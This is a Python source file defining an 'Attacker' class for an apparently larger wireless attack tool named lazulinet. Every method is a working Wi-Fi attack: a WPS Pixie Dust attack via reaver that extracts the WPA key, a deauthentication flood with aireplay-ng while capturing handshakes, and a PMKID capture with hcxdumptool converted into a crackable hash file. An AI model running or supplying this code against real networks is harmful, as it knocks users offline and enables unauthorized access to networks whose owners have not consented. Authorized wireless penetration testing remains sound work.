"""Attacker module."""
import os
import subprocess
import time
from datetime import datetime

class Attacker:
    def __init__(self, interface, output_dir):
        self.interface = interface
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def wps_attack(self, bssid, channel):
        print(f"\n[*] Starting WPS Pixie Dust attack on {bssid} (Ch {channel})")
        cmd = ["sudo", "reaver", "-i", self.interface, "-b", bssid, "-c", str(channel), "-vv", "-K", "1"]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        try:
            for line in proc.stdout:
                print(line, end="")
                if "WPA PSK:" in line: print(f"\n[!] KEY FOUND: {line.strip()}")
        except KeyboardInterrupt:
            proc.terminate()
            print("\n[*] Attack stopped.")

    def deauth_attack(self, bssid, channel, client=None):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        cap_file = os.path.join(self.output_dir, f"capture_{timestamp}")
        print(f"\n[*] Capturing on channel {channel} for {bssid}")
        airodump_cmd = ["sudo", "airodump-ng", "-c", str(channel), "--bssid", bssid, "-w", cap_file, self.interface]
        airodump = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        deauth_cmd = ["sudo", "aireplay-ng", "-0", "5", "-a", bssid, self.interface]
        if client: deauth_cmd.extend(["-c", client])
        subprocess.run(deauth_cmd)
        print("[*] Waiting for handshake (30 seconds)...")
        time.sleep(30)
        airodump.terminate()
        airodump.wait()
        cap_path = f"{cap_file}-01.cap"
        if os.path.exists(cap_path):
            print(f"[✓] Capture saved: {cap_path}")
            print(f"[*] Crack: python3 lazulinet.py crack --capture {cap_path}")
        else:
            print("[!] Capture failed.")

    def pmkid_attack(self, bssid, channel):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = os.path.join(self.output_dir, f"pmkid_{timestamp}")
        filter_file = "/tmp/lazulinet_target.txt"
        with open(filter_file, 'w') as f: f.write(bssid.replace(":", ""))
        cmd = ["sudo", "hcxdumptool", "-i", self.interface, "-c", str(channel), "--filterlist", filter_file, "--filtermode", "2", "-o", f"{out_file}.pcapng", "--enable_status", "15"]
        print(f"[*] Capturing PMKID for 30 seconds...")
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            time.sleep(30)
        except KeyboardInterrupt:
            pass
        proc.terminate()
        proc.wait()
        if os.path.exists(f"{out_file}.pcapng"):
            print(f"[✓] PMKID saved: {out_file}.pcapng")
            hash_file = f"{out_file}.22000"
            subprocess.run(["hcxpcapngtool", "-o", hash_file, f"{out_file}.pcapng"])
            print(f"[✓] Hash file: {hash_file}")
        else:
            print("[!] PMKID capture failed.")
